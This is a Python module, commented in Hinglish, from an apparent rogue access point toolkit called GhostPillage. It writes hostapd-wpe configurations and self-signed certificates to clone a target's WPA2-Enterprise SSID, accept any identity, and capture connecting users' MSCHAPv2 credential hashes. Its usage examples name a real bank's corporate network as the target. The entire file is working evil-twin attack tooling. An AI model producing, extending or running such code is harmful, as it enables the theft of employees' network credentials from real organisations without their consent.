#!/usr/bin/env python3
"""
ghostap/hostapd_config.py — Rogue Enterprise AP Configuration Generator

Yeh file hostapd-wpe ke liye configuration generate karti hai.
hostapd-wpe ek modified version hai hostapd ka jo automatically
EAP credentials capture karta hai (username + MSCHAPv2 hash).

Key features:
- WPA2-Enterprise mode (PEAP-MSCHAPv2, EAP-TTLS)
- Self-signed certificate generation (auto)
- Optional real certificate injection
- Channel-specific or automatic
- Client MAC filtering (optional)
"""

import os
import sys
import time
import subprocess
from datetime import datetime

# Local imports
from utils.helpers import log, write_file, file_exists, run_command


class HostapdConfig:
    """
    hostapd-wpe configuration generator.
    
    Generates a complete hostapd-wpe configuration file
    for creating a rogue Enterprise WiFi access point.
    """
    
    def __init__(self, interface, ssid, channel=6, config_dir="/tmp/ghostpillage", verbose=False):
        """
        Initialize configuration generator.
        
        Args:
            interface (str): WiFi interface (e.g., wlan0)
            ssid (str): SSID to broadcast (clone target's SSID)
            channel (int): Channel for rogue AP (default: 6)
            config_dir (str): Directory for config files
            verbose (bool): Verbose logging
        """
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.config_dir = config_dir
        self.verbose = verbose
        self.log_file = os.path.join(config_dir, "hostapd_config.log")
        
        # Create directories
        self.hostapd_dir = os.path.join(config_dir, "hostapd")
        os.makedirs(self.hostapd_dir, exist_ok=True)
        
        # Certificate paths
        self.cert_dir = "/etc/hostapd-wpe/certs"
        self.ca_cert = os.path.join(self.cert_dir, "ca.pem")
        self.server_cert = os.path.join(self.cert_dir, "server.pem")
        self.server_key = os.path.join(self.cert_dir, "server.key")
        self.dh_params = os.path.join(self.cert_dir, "dh")
        
        log(self.log_file, f"[+] HostapdConfig initialized for SSID: {ssid}", verbose)
    
    
    def generate_config(self, target_bssid=None, capture_file=None):
        """
        Generate complete hostapd-wpe configuration.
        
        Step-by-step:
        1. Check/install certificates
        2. Generate EAP user file
        3. Create hostapd-wpe.conf
        4. Set up logging
        
        Args:
            target_bssid (str): Optional BSSID to clone
            capture_file (str): Optional path for credential capture output
        
        Returns:
            str: Path to generated configuration file
        """
        log(self.log_file, "[*] Generating hostapd-wpe configuration...", self.verbose)
        print(f"\n[*] Generating GhostAP configuration for SSID: '{self.ssid}'")
        print(f"    Interface: {self.interface}, Channel: {self.channel}")
        
        # Step 1: Verify certificates exist
        certs_ok = self._check_certificates()
        if not certs_ok:
            print("    [!] Certificates not found! Will generate new ones...")
            self._setup_certificates()
        
        # Step 2: Generate EAP users file
        eap_file = self._generate_eap_users()
        if not eap_file:
            log(self.log_file, "[!] Failed to create EAP users file", self.verbose)
            return None
        
        # Step 3: Create hostapd-wpe main config
        config_file = os.path.join(self.hostapd_dir, "ghostap.conf")
        config_content = self._build_config_content(eap_file, target_bssid, capture_file)
        
        if not write_file(config_file, config_content):
            log(self.log_file, "[!] Failed to write hostapd config", self.verbose)
            print("    [!] Failed to write configuration file!")
            return None
        
        log(self.log_file, f"[+] Configuration written to: {config_file}", self.verbose)
        print(f"    [+] Config file: {config_file}")
        
        # Step 4: Verify config
        if self._verify_config(config_file):
            print(f"    [+] Configuration verified ✓")
        else:
            print(f"    [!] Warning: Config verification had issues")
        
        # Step 5: Setup log monitoring (for credential capture)
        self._setup_log_monitor()
        
        return config_file
    
    
    def _check_certificates(self):
        """
        Check if hostapd-wpe certificates exist.
        
        hostapd-wpe install ke saath default certificates aate hain:
        /etc/hostapd-wpe/certs/
        
        Returns:
            bool: True if all required certs exist
        """
        required_certs = [self.ca_cert, self.server_cert, self.server_key, self.dh_params]
        
        for cert in required_certs:
            if not file_exists(cert):
                log(self.log_file, f"[!] Missing certificate: {cert}", self.verbose)
                return False
        
        log(self.log_file, "[+] All certificates found", self.verbose)
        return True
    
    
    def _setup_certificates(self):
        """
        Generate new self-signed certificates for hostapd-wpe.
        
        hostapd-wpe comes with a certificate bootstrap script.
        If certificates are missing, generate fresh ones.
        """
        log(self.log_file, "[*] Setting up certificates...", self.verbose)
        print("    [*] Generating self-signed certificates...")
        
        # Check if bootstrap script exists
        bootstrap_script = "/etc/hostapd-wpe/certs/bootstrap"
        if file_exists(bootstrap_script):
            cmd = f"cd {os.path.dirname(bootstrap_script)} && bash bootstrap"
            result = run_command(cmd, verbose=self.verbose, log_file=self.log_file)
            
            if result["success"]:
                log(self.log_file, "[+] Certificates generated successfully", self.verbose)
                print("    [+] Certificates generated ✓")
                return True
        
        # Manual certificate generation fallback
        log(self.log_file, "[*] Manual certificate generation...", self.verbose)
        
        # Create cert directory if needed
        os.makedirs(self.cert_dir, exist_ok=True)
        
        # Generate CA key and certificate
        ca_key = os.path.join(self.cert_dir, "ca.key")
        cmds = [
            f"openssl genrsa -out {ca_key} 2048",
            f"openssl req -new -x509 -days 3650 -key {ca_key} -out {self.ca_cert} -subj '/CN=GhostPillage CA/'",
            f"openssl genrsa -out {self.server_key} 2048",
            f"openssl req -new -key {self.server_key} -out /tmp/server.csr -subj '/CN={self.ssid}/'",
            f"openssl x509 -req -days 3650 -in /tmp/server.csr -CA {self.ca_cert} -CAkey {ca_key} -CAcreateserial -out {self.server_cert}",
            f"openssl dhparam -out {self.dh_params} 2048"
        ]
        
        for cmd in cmds:
            result = run_command(cmd, verbose=self.verbose, log_file=self.log_file)
            if not result["success"]:
                log(self.log_file, f"[!] Cert generation failed: {cmd[:50]}", self.verbose)
                print(f"    [!] Certificate generation failed: {result['stderr'][:100]}")
                return False
        
        # Cleanup
        for tmp in ["/tmp/server.csr", os.path.join(self.cert_dir, "ca.key"), os.path.join(self.cert_dir, "ca.srl")]:
            if file_exists(tmp):
                os.remove(tmp)
        
        log(self.log_file, "[+] Certificates generated manually", self.verbose)
        print("    [+] Certificates generated manually ✓")
        return True
    
    
    def _generate_eap_users(self):
        """
        Generate EAP user file for hostapd-wpe.
        
        Yeh file define karti hai ki kaunsa EAP method use karna hai.
        hostapd-wpe ke saath, hum 'passphrase' use karte hain jo
        automatically MSCHAPv2 challenge/response capture karta hai.
        
        Returns:
            str: Path to EAP users file, or None on failure
        """
        eap_file = os.path.join(self.hostapd_dir, "eap_users")
        
        # hostapd-wpe syntax:
        # *    PEAP,TTLS,TLS
        # "*" means accept any username
        # "passphrase" makes hostapd-wpe capture the MSCHAPv2 hash
        
        eap_content = """# EAP Users file for GhostPillage Rogue AP
# Format: identity    method    [password]
# "*" means accept all identities
# "passphrase" captures MSCHAPv2 challenge/response

*	PEAP,TTLS,TLS
"""
        
        if write_file(eap_file, eap_content):
            log(self.log_file, f"[+] EAP users file: {eap_file}", self.verbose)
            return eap_file
        
        return None
    
    
    def _build_config_content(self, eap_file, target_bssid=None, capture_file=None):
        """
        Build hostapd-wpe configuration file content.
        
        Config sections:
        - Interface settings
        - Wireless settings
        - EAP/RADIUS settings
        - Certificate paths
        - Logging
        
        FIXED for hostapd-wpe v2.10:
        - eap_server=1 (NOT eap_authenticator — renamed in v2.10)
        - Removed eap_server_erasure_interval (unknown in v2.10)
        - Removed eapol_key_timeout (unknown in v2.10)
        
        Args:
            eap_file (str): Path to EAP users file
            target_bssid (str): Optional BSSID to clone
            capture_file (str): Optional credential capture path
        
        Returns:
            str: Full configuration content
        """
        # Determine capture file path
        if not capture_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = os.path.join(self.hostapd_dir, f"creds_{timestamp}.log")
        
        config = f"""# GhostPillage - Rogue Enterprise AP Configuration
# Generated: {datetime.now().isoformat()}
# Target SSID: {self.ssid}

# ==================== INTERFACE SETTINGS ====================
interface={self.interface}
driver=nl80211

# ==================== WIRELESS SETTINGS ====================
ssid={self.ssid}
hw_mode=g
channel={self.channel}
ieee80211n=1
wmm_enabled=1

# ==================== BROADCAST SETTINGS ====================
# Don't hide SSID (we want clients to see it)
ignore_broadcast_ssid=0

# ==================== AUTHENTICATION ====================
# WPA2-Enterprise mode
wpa=3
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
# FIXED: use eap_server=1 (eap_authenticator was renamed in v2.10)
eap_server=1

# ==================== EAP SETTINGS ====================
eap_user_file={eap_file}

# ==================== CERTIFICATES ====================
ca_cert={self.ca_cert}
server_cert={self.server_cert}
private_key={self.server_key}
private_key_passwd=whatever
dh_file={self.dh_params}
fragment_size=1300

# ==================== LOGGING ====================
# Output file for credential captures
# hostapd-wpe logs credentials to its own log
ctrl_interface=/var/run/hostapd-wpe

# ==================== PERFORMANCE ====================
max_num_sta=128
beacon_int=100
dtim_period=2

# ==================== MAC FILTERING (OPTIONAL) ====================
# Uncomment to allow only specific clients:
# accept_mac_file=/etc/hostapd-wpe/accept.mac
# macaddr_acl=1

"""
        
        log(self.log_file, f"[+] Config built. Capture file: {capture_file}", self.verbose)
        return config
    
    
    def _verify_config(self, config_file):
        """
        Basic verification of generated configuration.
        
        Args:
            config_file (str): Path to config file
        
        Returns:
            bool: True if config looks valid
        """
        if not file_exists(config_file):
            return False
        
        content = open(config_file).read()
        
        # Check essential settings exist
        checks = [
            f"interface={self.interface}" in content,
            f"ssid={self.ssid}" in content,
            "wpa_key_mgmt=WPA-EAP" in content,
            "ieee8021x=1" in content,
            self.ca_cert in content,
            self.server_cert in content,
        ]
        
        all_pass = all(checks)
        if all_pass:
            log(self.log_file, "[+] Configuration verification passed", self.verbose)
        else:
            failed = [i for i, c in enumerate(checks) if not c]
            log(self.log_file, f"[!] Config checks failed: {failed}", self.verbose)
        
        return all_pass
    
    
    def _setup_log_monitor(self):
        """
        Setup log monitoring for credential capture.
        
        hostapd-wpe apne aap credentials log karta hai. Yeh function
        ensure karta hai ki log file accessible hai.
        """
        log_path = "/tmp/hostapd-wpe/hostapd-wpe.log"
        log_dir = os.path.dirname(log_path)
        
        if not file_exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
                log(self.log_file, f"[+] Created log directory: {log_dir}", self.verbose)
            except Exception as e:
                log(self.log_file, f"[!] Could not create log dir: {e}", self.verbose)
        
        log(self.log_file, "[+] Log monitor setup complete", self.verbose)
    
    
    def generate_enterprise_config(self, domain_name="CORPORATE"):
        """
        Generate enterprise-specific configuration with domain.
        
        Kuch clients sirf specific domain names accept karte hain.
        Yeh function domain-specific EAP identity format use karta hai.
        
        FIXED for hostapd-wpe v2.10:
        - eap_server=1 (NOT eap_authenticator)
        - Removed eap_server_erasure_interval
        - Removed eapol_key_timeout
        
        Args:
            domain_name (str): Domain to use (e.g., "ICICI-BANK")
        
        Returns:
            str: Config file path
        """
        log(self.log_file, f"[*] Generating enterprise config for domain: {domain_name}", self.verbose)
        
        # Create domain-specific EAP file
        eap_file = os.path.join(self.hostapd_dir, f"eap_users_{domain_name}")
        eap_content = f"""# EAP Users for {domain_name}
*	PEAP,TTLS,TLS
"""
        write_file(eap_file, eap_content)
        
        # Generate enhanced config with domain settings
        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
ieee80211n=1
wmm_enabled=1
ignore_broadcast_ssid=0
wpa=3
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
# FIXED: use eap_server=1 (eap_authenticator was renamed in v2.10)
eap_server=1
eap_user_file={eap_file}
ca_cert={self.ca_cert}
server_cert={self.server_cert}
private_key={self.server_key}
private_key_passwd=whatever
dh_file={self.dh_params}
fragment_size=1300
ctrl_interface=/var/run/hostapd-wpe
max_num_sta=128
beacon_int=100
dtim_period=2

# Domain-specific settings
# eap_identity=1
# anonymous_identity=anonymous@{domain_name.lower()}
"""
        
        config_file = os.path.join(self.hostapd_dir, f"ghostap_{domain_name}.conf")
        write_file(config_file, config)
        
        log(self.log_file, f"[+] Enterprise config for {domain_name}: {config_file}", self.verbose)
        print(f"    [+] Enterprise config for {domain_name} created ✓")
        
        return config_file


# Agar directly run kiya jaaye
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 hostapd_config.py <interface> <ssid> [channel]")
        print("Example: python3 hostapd_config.py wlan0 'ICICI-Bank-Corp' 6")
        sys.exit(1)
    
    iface = sys.argv[1]
    ssid = sys.argv[2]
    channel = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    
    config_gen = HostapdConfig(iface, ssid, channel, verbose=True)
    config_file = config_gen.generate_config()
    
    if config_file:
        print(f"\n[✓] Configuration ready: {config_file}")
        print(f"    Run: sudo hostapd-wpe {config_file}")
    else:
        print("\n[✗] Configuration generation failed")